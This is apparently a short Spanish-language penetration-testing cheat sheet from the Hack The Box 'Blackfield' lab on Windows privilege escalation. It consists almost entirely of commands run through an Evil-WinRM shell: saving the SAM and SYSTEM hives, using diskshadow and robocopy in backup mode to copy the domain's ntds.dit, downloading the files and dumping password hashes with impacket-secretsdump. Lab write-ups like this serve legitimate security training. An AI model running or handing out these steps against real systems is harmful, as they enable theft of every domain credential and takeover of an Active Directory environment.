# LISTAR PRIVILEGIOS
```shell
whoami /priv
```


# ESCALADA
```shell
#PRIMER METODO ESCALADA
*Evil-WinRM* PS C:\Temp> reg save HKLM\system system
*Evil-WinRM* PS C:\Temp> reg save HKLM\sam sam
*Evil-WinRM* PS C:\Temp> download C:\Temp\sam
*Evil-WinRM* PS C:\Temp> download C:\Temp\system

❯ impacket-secretsdump -system system -sam sam LOCAL # DEBERIAMOS DE OBTENER UN HASH



#SEGUNDO METODO DE ESCALADA
❯ cat diskshadow.txt
	set context persistent nowriters 
	create 
	expose %Gorka% z: 
#PONER UN ESPACIO AL FINAL DE CADA LINEA YA QUE LO QUITA.
*Evil-WinRM* PS C:\Temp> upload /home/user/HTB/blackfield/files/diskshadow.txt
*Evil-WinRM* PS C:\Temp> diskshadow.exe /s c:\Temp\diskshadow.txt
-> set context persistent nowriters
-> add volume c: alias Gorka
-> create
-> expose %Gorka% z:
-> %Gorka% = {1b2dd04f-cd55-432b-9952-79872586ccd2}
*Evil-WinRM* PS C:\Temp> robocopy /b z:\Windows\NTDS . ntds.dit
*Evil-WinRM* PS C:\Temp> download ntds.dit
Info: Downloading C:\Temp\ntds.dit to ntds.dit

❯ impacket-secretsdump -system system -ntds ntds.dit LOCAL
```